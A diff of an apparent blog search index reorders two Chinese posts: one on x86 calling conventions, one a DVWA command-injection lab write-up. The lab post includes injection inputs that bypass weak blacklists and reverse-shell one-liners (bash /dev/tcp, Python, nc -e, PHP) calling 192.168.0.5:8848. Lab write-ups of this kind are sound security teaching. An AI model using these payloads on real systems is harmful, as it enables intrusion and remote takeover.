@@ -467,31 +467,6 @@
   
   
   <entry>
-    <title>call的几种传参方式</title>
-    <link href="undefined2019/08/10/call%E7%9A%84%E5%87%A0%E7%A7%8D%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F/"/>
-    <url>2019/08/10/call%E7%9A%84%E5%87%A0%E7%A7%8D%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F/</url>
-    
-    <content type="html"><![CDATA[<p>stdcall 参数使用栈，平衡是在函数内，通过函数内的最后一个retn X来平衡，这个X用来指定pop几个字来平衡堆栈 </p><p>cdecl 栈传参，函数外平衡堆栈</p><p>fastcall 是通过寄存器，因为是寄存器fast嘛</p><p><strong>下面这种call是用在有类对象引用的时候来表示传参的</strong><br>thiscall 是用ecx来穿this指针的，一般都是 类似<code>lea ecx [ebp+var_20]</code><br>进入函数函数后  ecx就能会直接拿来用，不会再次赋值。</p><p><strong>识别参数个数</strong><br>1.点亮call后依次进去看调用的方式，非stdcall则再看参数的中占用大小<br>2.划分push 的归属<br>3.遇到栈平衡相关指令。点亮push核对下已分配是否有误<br>4.注意识别出某些push为下一个函数所用<br>5.另外还要看某push归属于某个函数的最后参数却不使用的参数<br>不确定的可以call进函数里，看看最后函数返回的时候堆栈平衡的参数大小，来确定传入参数</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>逆向</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>传参方式</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>调试dll的两种方法</title>
     <link href="undefined2019/08/10/%E8%B0%83%E8%AF%95dll%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
     <url>2019/08/10/%E8%B0%83%E8%AF%95dll%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
@@ -509,6 +484,31 @@
     <tags>
       
       <tag>调试dll</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>call的几种传参方式</title>
+    <link href="undefined2019/08/10/call%E7%9A%84%E5%87%A0%E7%A7%8D%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F/"/>
+    <url>2019/08/10/call%E7%9A%84%E5%87%A0%E7%A7%8D%E4%BC%A0%E5%8F%82%E6%96%B9%E5%BC%8F/</url>
+    
+    <content type="html"><![CDATA[<p>stdcall 参数使用栈，平衡是在函数内，通过函数内的最后一个retn X来平衡，这个X用来指定pop几个字来平衡堆栈 </p><p>cdecl 栈传参，函数外平衡堆栈</p><p>fastcall 是通过寄存器，因为是寄存器fast嘛</p><p><strong>下面这种call是用在有类对象引用的时候来表示传参的</strong><br>thiscall 是用ecx来穿this指针的，一般都是 类似<code>lea ecx [ebp+var_20]</code><br>进入函数函数后  ecx就能会直接拿来用，不会再次赋值。</p><p><strong>识别参数个数</strong><br>1.点亮call后依次进去看调用的方式，非stdcall则再看参数的中占用大小<br>2.划分push 的归属<br>3.遇到栈平衡相关指令。点亮push核对下已分配是否有误<br>4.注意识别出某些push为下一个函数所用<br>5.另外还要看某push归属于某个函数的最后参数却不使用的参数<br>不确定的可以call进函数里，看看最后函数返回的时候堆栈平衡的参数大小，来确定传入参数</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>传参方式</tag>
       
     </tags>
     
@@ -546,37 +546,6 @@
   
   
   <entry>
-    <title>web渗透基础三</title>
-    <link href="undefined2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9/"/>
-    <url>2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9/</url>
-    
-    <content type="html"><![CDATA[<h2 id="命令执行以及反弹shell姿势"><a href="#命令执行以及反弹shell姿势" class="headerlink" title="命令执行以及反弹shell姿势"></a>命令执行以及反弹shell姿势</h2><p>还是DVWA靶机的Command Injection</p><p>功能是在本地使用shell_exec执行ping命令</p><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {     // Get input     $target = $_REQUEST[ &#39;ip&#39; ];     // Determine OS and execute the ping command.     if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {         // Windows         $cmd = shell_exec( &#39;ping  &#39; . $target );     }     else {         // *nix         $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    }     // Feedback for the end user     echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; </code></pre><p>输入没有任何过滤，直接执行输入，这里要了解下<strong>命令链接符</strong><a href="https://www.cnblogs.com/Monarch-T/p/10388582.html" target="_blank" rel="noopener">参考</a></p><blockquote><p>&amp;&amp; :前一个指令执行成功，后面的指令才继续执行，就像进行与操作一样</p><p>|| :前一个命令执行失败，后面的才继续执行，类似于或操作</p><p>&amp; ：直接连接多个命令</p><p>| ：管道符，将前一个命令的输出作为下一个命令的输入</p><p>; ：直接连接多个命令</p></blockquote><p>我们尝试如下输入</p><p><code>127.0.0.1;ls</code></p><p>确实执行了我们的ls命令</p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>这里只贴添加的代码</p><pre><code>  $substitutions = array(         &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,         &#39;;&#39;  =&gt; &#39;&#39;,     );     // Remove any of the charactars in the array (blacklist).     $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</code></pre><p>添加了特定字符过滤，但是没过滤完整，也还是可以执行命令</p><p>如下命令都是可以执行的</p><pre><code>127.0.0.1&amp;ls127.0.0.A|ls127.0.0.A||ls</code></pre><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><pre><code> $substitutions = array(         &#39;&amp;&#39;  =&gt; &#39;&#39;,         &#39;;&#39;  =&gt; &#39;&#39;,         &#39;| &#39; =&gt; &#39;&#39;,  # | 后面多了个空格，导致|没被过滤        &#39;-&#39;  =&gt; &#39;&#39;,         &#39;$&#39;  =&gt; &#39;&#39;,         &#39;(&#39;  =&gt; &#39;&#39;,         &#39;)&#39;  =&gt; &#39;&#39;,         &#39;`&#39;  =&gt; &#39;&#39;,         &#39;||&#39; =&gt; &#39;&#39;,     );     // Remove any of the charactars in the array (blacklist).     $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</code></pre><p>漏洞见注释</p><p>可以使用<code>127.0.0.A|ls</code>命令执行</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>这里我也记录一下反弹shell<br><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">参考</a></p><h3 id="linux文件描述符"><a href="#linux文件描述符" class="headerlink" title="linux文件描述符"></a>linux文件描述符</h3><p>linux文件描述符：linux shell下有三种标准的文件描述符，分别如下：</p><ul><li>0 - stdin 代表标准输入,使用&lt;或&lt;&lt;</li><li>1 - stdout 代表标准输出,使用&gt;或&gt;&gt;</li><li>2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</li></ul><p>还有就是&gt;&amp;这个符号的含义，最好的理解是这样的：</p><ul><li>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</li><li>当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</li></ul><h3 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>开始之前都在本机开启一个监听，<code>nc -lnvp 8848</code></p><p><strong>注意：如果是对外网进行渗透，建议使用自己的服务器接收shell。否者可能会因为网关的nat导致连不上</strong></p><h4 id="linux机制版本"><a href="#linux机制版本" class="headerlink" title="linux机制版本"></a>linux机制版本</h4><p><code>bash -i &gt;&amp; /dev/tcp/192.168.0.5/8848 0&gt;&amp;1</code></p><h4 id="python-版本"><a href="#python-版本" class="headerlink" title="python 版本"></a>python 版本</h4><p><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.0.5&#39;,8848));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></p><h4 id="nc-版本"><a href="#nc-版本" class="headerlink" title="nc 版本"></a>nc 版本</h4><p>需要被攻击机安装nc，一般其他shell都不行可以试试这个，最后搏一搏。</p><p><code>nc -e /bin/bash 192.168.0.5 8848</code></p><h4 id="php-版本"><a href="#php-版本" class="headerlink" title="php 版本"></a>php 版本</h4><p><code>php- &#39;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.5/8848&quot;)&#39;</code></p><p><code>php -r &#39;$sock=fsockopen(&quot;192.168.0.5&quot;,8848);exec(&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p>这里的3是代表之前创建的sock的文件描述符。</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>CTF</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>php</tag>
-      
-      <tag>linux</tag>
-      
-      <tag>DVWA</tag>
-      
-      <tag>反弹shell</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>web渗透基础二</title>
     <link href="undefined2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
     <url>2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
@@ -594,6 +563,37 @@
     <tags>
       
       <tag>宽字节注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>web渗透基础三</title>
+    <link href="undefined2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9/"/>
+    <url>2019/06/11/WEB%E6%B8%A9%E4%B9%A0%E7%AC%AC%E4%B8%89%E5%A4%A9/</url>
+    
+    <content type="html"><![CDATA[<h2 id="命令执行以及反弹shell姿势"><a href="#命令执行以及反弹shell姿势" class="headerlink" title="命令执行以及反弹shell姿势"></a>命令执行以及反弹shell姿势</h2><p>还是DVWA靶机的Command Injection</p><p>功能是在本地使用shell_exec执行ping命令</p><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {     // Get input     $target = $_REQUEST[ &#39;ip&#39; ];     // Determine OS and execute the ping command.     if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {         // Windows         $cmd = shell_exec( &#39;ping  &#39; . $target );     }     else {         // *nix         $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    }     // Feedback for the end user     echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt; </code></pre><p>输入没有任何过滤，直接执行输入，这里要了解下<strong>命令链接符</strong><a href="https://www.cnblogs.com/Monarch-T/p/10388582.html" target="_blank" rel="noopener">参考</a></p><blockquote><p>&amp;&amp; :前一个指令执行成功，后面的指令才继续执行，就像进行与操作一样</p><p>|| :前一个命令执行失败，后面的才继续执行，类似于或操作</p><p>&amp; ：直接连接多个命令</p><p>| ：管道符，将前一个命令的输出作为下一个命令的输入</p><p>; ：直接连接多个命令</p></blockquote><p>我们尝试如下输入</p><p><code>127.0.0.1;ls</code></p><p>确实执行了我们的ls命令</p><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>这里只贴添加的代码</p><pre><code>  $substitutions = array(         &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,         &#39;;&#39;  =&gt; &#39;&#39;,     );     // Remove any of the charactars in the array (blacklist).     $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</code></pre><p>添加了特定字符过滤，但是没过滤完整，也还是可以执行命令</p><p>如下命令都是可以执行的</p><pre><code>127.0.0.1&amp;ls127.0.0.A|ls127.0.0.A||ls</code></pre><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><pre><code> $substitutions = array(         &#39;&amp;&#39;  =&gt; &#39;&#39;,         &#39;;&#39;  =&gt; &#39;&#39;,         &#39;| &#39; =&gt; &#39;&#39;,  # | 后面多了个空格，导致|没被过滤        &#39;-&#39;  =&gt; &#39;&#39;,         &#39;$&#39;  =&gt; &#39;&#39;,         &#39;(&#39;  =&gt; &#39;&#39;,         &#39;)&#39;  =&gt; &#39;&#39;,         &#39;`&#39;  =&gt; &#39;&#39;,         &#39;||&#39; =&gt; &#39;&#39;,     );     // Remove any of the charactars in the array (blacklist).     $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</code></pre><p>漏洞见注释</p><p>可以使用<code>127.0.0.A|ls</code>命令执行</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>这里我也记录一下反弹shell<br><a href="https://www.freebuf.com/articles/system/178150.html" target="_blank" rel="noopener">参考</a></p><h3 id="linux文件描述符"><a href="#linux文件描述符" class="headerlink" title="linux文件描述符"></a>linux文件描述符</h3><p>linux文件描述符：linux shell下有三种标准的文件描述符，分别如下：</p><ul><li>0 - stdin 代表标准输入,使用&lt;或&lt;&lt;</li><li>1 - stdout 代表标准输出,使用&gt;或&gt;&gt;</li><li>2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</li></ul><p>还有就是&gt;&amp;这个符号的含义，最好的理解是这样的：</p><ul><li>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</li><li>当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</li></ul><h3 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>开始之前都在本机开启一个监听，<code>nc -lnvp 8848</code></p><p><strong>注意：如果是对外网进行渗透，建议使用自己的服务器接收shell。否者可能会因为网关的nat导致连不上</strong></p><h4 id="linux机制版本"><a href="#linux机制版本" class="headerlink" title="linux机制版本"></a>linux机制版本</h4><p><code>bash -i &gt;&amp; /dev/tcp/192.168.0.5/8848 0&gt;&amp;1</code></p><h4 id="python-版本"><a href="#python-版本" class="headerlink" title="python 版本"></a>python 版本</h4><p><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.0.5&#39;,8848));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></p><h4 id="nc-版本"><a href="#nc-版本" class="headerlink" title="nc 版本"></a>nc 版本</h4><p>需要被攻击机安装nc，一般其他shell都不行可以试试这个，最后搏一搏。</p><p><code>nc -e /bin/bash 192.168.0.5 8848</code></p><h4 id="php-版本"><a href="#php-版本" class="headerlink" title="php 版本"></a>php 版本</h4><p><code>php- &#39;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.5/8848&quot;)&#39;</code></p><p><code>php -r &#39;$sock=fsockopen(&quot;192.168.0.5&quot;,8848);exec(&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p>这里的3是代表之前创建的sock的文件描述符。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>DVWA</tag>
+      
+      <tag>php</tag>
+      
+      <tag>linux</tag>
+      
+      <tag>反弹shell</tag>
       
     </tags>
     
